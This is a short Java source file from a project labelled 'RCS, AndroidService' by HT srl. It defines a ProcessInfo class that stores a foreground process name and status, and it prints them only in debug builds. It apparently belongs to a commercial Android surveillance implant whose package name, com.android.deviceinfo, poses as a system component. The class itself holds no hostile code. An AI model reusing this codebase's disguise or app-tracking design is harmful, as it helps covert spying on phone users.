/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ProcessInfo.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo;

import java.util.Collection;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.deviceinfo.auto.Cfg;

public class ProcessInfo {
	public String processInfo;
	public ProcessStatus status;

	public ProcessInfo(String currentForeground, ProcessStatus status) {
		this.processInfo = currentForeground;
		this.status = status;
	}
	
	@Override
	public String toString(){
		if(Cfg.DEBUG){
			return processInfo + " : " + status;
		}else{
			return super.toString();
		}
	}
}
